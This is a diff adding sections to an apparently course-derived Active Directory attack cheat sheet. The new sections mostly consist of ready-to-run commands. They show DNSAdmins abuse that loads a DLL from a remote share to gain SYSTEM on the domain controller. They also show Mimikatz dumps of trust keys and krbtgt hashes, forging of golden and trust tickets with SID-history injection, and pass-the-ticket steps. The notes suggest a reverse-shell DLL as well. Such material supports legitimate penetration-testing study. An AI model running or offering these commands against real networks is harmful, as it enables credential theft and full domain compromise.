@@ -236,6 +236,102 @@ Using Rubeus
 .\Rubeus.exe s4u /user:dcorp-adminsrv$ /rc4:1fadb1b13edbc5a61cbdc389e6f34c67 /impersonateuser:Administrator /msdsspn:"time/dcorpdc.dollarcorp.moneycorp.LOCAL" /altservice:ldap /ptt
 ```
 
+## DNS admin
+It is possible for the members of the DNSAdmins group to load arbitrary DLL with the privileges of dns.exe (SYSTEM). 
+
+In case the DC also serves as DNS, this will provide us escalation to DA. 
+
+Need privileges to restart the DNS service.
+
+1. Enumerate the members of the DNSAdmis group
+```powershell
+# Power view
+Get-NetGroupMember -GroupName "DNSAdmins"
+
+#Using ActiveDirectory module
+Get-ADGroupMember -Identity DNSAdmins
+```
+
+2. Compromise the member
+3.  From the privileges of DNSAdmins group member, configure DLL 
+
+```powershell
+# using dnscmd.exe (needs RSAT DNS)
+dnscmd dcorp-dc /config /serverlevelplugindll \\172.16.50.100\dll\mimilib.dll
+
+#Using DNSServer module (needs RSAT DNS)
+
+$dnsettings = Get-DnsServerSetting -ComputerName dcorp-dc -Verbose -Alll
+$dnsettings.ServerLevelPluginDll = "\\172.16.50.100\dll\mimilib.dll"
+Set-DnsServerSetting -InputObject $dnsettings -ComputerName dcorp-dc -Verbose
+```
+
+4. Restart the DNS service
+```powershell
+sc \\dcorp-dc stop dnssc \\dcorp-dc start dns
+```
+
+By default, the mimilib.dll logs all DNS queries to C:\Windows\System32\kiwidns.log
+
+You could load your own dll, which can create reverse shell, but DNS is synchornus so the DNS maybe busy with reverseshell and make the DNS response halt for a moment and if dll load fail the DNS will not start
+
+## Trust
+### Child to Parent
+### 1. Using Trust ticket
+1. find the trust key
+```
+Invoke-Mimikatz -Command '"lsadump::trust /patch"'
+Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc
+
+# DCSync (mcrop$ is the parant account)
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
+```
+
+2. Forge the trust ticket
+```powershell
+Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:d23d55d765977e1da5a78a173fbdd50f /service:krbtgt /target:moneycorp.local /ticket:C:\AD\Tools\kekeo_old\trust_tkt.kirbi"'
+```
+* SID = SID of the current domain
+* SIDs = SID for SID history injection (in this case, SID of the enterprise admins group of the parent domain)
+* rc4 = trust key
+* ticket = whrer to save the trust ticket
+
+3. Get a TGS for a service 
+```powershell
+.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
+```
+
+4. Use the TGS to access the targeted service (may need to use it twice)
+```powershell
+.\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
+```
+
+Or using Rubeus for the step 3-4
+```
+.\Rubeus.exe asktgs /ticket:C:\AD\Tools\kekeo_old\trust_tkt.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:mcorpdc.moneycorp.local /ptt
+```
+
+### 2. Using krbtgt hash
+1. get krbtgt hash
+```powershell
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"' 
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
+```
+
+2. generate ticket with SIDHistory abuse
+```powershell
+# Save ticket
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'
+
+# Directly pass the ticket (Skip Step3)
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ptt"'
+``` 
+* SIDs = SID for SID history injection (in this case, SID of the enterprise admins group of the parent domain)
+
+3. Pass the ticket
+```powershell
+Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'
+``` 
 
 
 # Jenkin --> move to CVE catagory
